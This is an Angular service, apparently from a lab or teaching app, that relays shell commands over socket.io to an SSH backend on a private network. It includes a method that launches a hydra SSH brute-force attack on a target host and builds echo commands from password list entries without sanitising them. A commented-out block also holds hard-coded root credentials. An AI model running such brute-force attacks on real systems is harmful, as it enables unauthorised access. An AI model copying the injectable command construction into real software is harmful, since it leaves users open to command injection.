import {Injectable} from '@angular/core';
import 'rxjs/add/operator/catch';
import * as io from 'socket.io-client';
import {Subject} from 'rxjs/Subject';
import {Observable} from 'rxjs/Observable';

@Injectable()
export class ApiSshService {

  protected urlAPISSH: string = '192.168.56.101';
  protected urlCible: string = '192.168.56.102';
  protected portSocket: string = '8888';

  socket: SocketIOClient.Socket = null;


  public shellAnswer;

  constructor() {
    //Ouverture d'un socket entre l'app et l'API SSH
    this.connectSocket('http://' + this.urlAPISSH + ':' + this.portSocket);
    this.shellAnswer = new Observable(observer => {
      this.socket.on('data', function (data, res) {
        observer.next(data);
      });
    });
  }

  connectSocket(uri: String) {
    if (this.socket !== null) {
      console.log(' - socket already existing - ');
      return;
    }
    this.socket = io.connect(uri);
  }

  disconnectSocket() {
    if (this.socket == null) {
      console.log(' - socket already disconnected - ');
      return;
    }
    this.socket.emit('disconnect');
    this.socket.disconnect();
    this.socket = null;
  }

  /*test(){
    this.socket.emit('shellexec', { command: 'cd ~ && ls -a' });
    this.socket.emit('sshAccess', { ip: '192.168.56.102', user : 'root', password : 'network'});
    this.socket.on('shellexecanswer', function (data) {
      if(data === undefined){
        console.log('undefined data :(');
      }else {
        console.log(data);
      }
    });
  }*/

  connectSsh(ip, user, password){
    this.socket.emit('connectSSH', {ip: ip, user : user, password : password});
  }

  disconnectSsh() {
    this.socket.emit('disconnectSSH');
  }


  /* getData(){
     this.socket.on('shellexecanswer', function (data) {
       if(data === undefined){
         console.log('undefined data :(');
       }else {
         console.log(data);
       }
     })
   }*/

  sendCommand(command: string) {
    this.socket.emit('command', command);
  }

  // SPECIFICS COMMANDS

  writePasswordFile(tab) {
    for (let i = 0; i < tab.length; i++) {
      if (i === 0) {
        this.socket.emit('command', 'echo "' + tab[i] + '" > password.txt\r');
      } else {
        this.socket.emit('command', 'echo "' + tab[i] + '" >> password.txt\r');
      }
    }
  }

  runBruteForceAttack() {
    this.socket.emit('command', 'hydra -V -L username.txt -P password.txt ' + this.urlCible + ' -t 4 ssh\r');
  }
}
